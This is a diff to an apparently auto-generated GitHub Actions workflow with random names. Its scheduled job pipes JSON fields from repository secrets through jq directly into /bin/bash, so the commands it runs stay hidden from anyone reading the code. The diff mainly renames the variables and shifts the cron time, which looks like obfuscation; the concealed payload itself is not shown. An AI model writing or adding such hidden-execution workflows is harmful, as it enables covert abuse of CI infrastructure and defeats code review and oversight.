@@ -1,24 +1,26 @@
 name: liaogaitx
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 2/6 * * *'
-jobs:  # 7105
+    - cron: '51 3/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: liaogaitx
         env:
-          pagsn88: ${{ secrets.pagsn88 }}
+          wwxlo681: ${{ secrets.wwxlo681 }}
         run: |
-          echo $pagsn88 | jq -r .kjm1718 | /bin/bash
-          echo $sgd72 | jq -r .qak46 | /bin/bash
-          echo $ynffj96038 | jq -r .mtar378 | /bin/bash
-          echo $tbc47384 | jq -r .d99 | /bin/bash
-          echo $rzwuo309 | jq -r .zxi4522 | /bin/bash
-          echo $zne12 | jq -r .youkm30 | /bin/bash
-          echo $kyixp64888 | jq -r .x90 | /bin/bash
-          echo $ab77 | jq -r .nz7 | /bin/bash
-          echo $gtcd458 | jq -r .cl25 | /bin/bash
+          echo $wwxlo681 | jq -r .ix817 | /bin/bash
+          echo $osjv09904 | jq -r .pj04 | /bin/bash
+          echo $rh9 | jq -r .spd012 | /bin/bash
+          echo $wml77623 | jq -r .cra450 | /bin/bash
+          echo $e54109 | jq -r .hdt6546 | /bin/bash
+          echo $bnvbf2774 | jq -r .g7933 | /bin/bash
+          echo $qc21979 | jq -r .wgwyp59545 | /bin/bash
+          echo $bdh5696 | jq -r .dxi29725 | /bin/bash
+          echo $xtz46503 | jq -r .znusv69 | /bin/bash
 
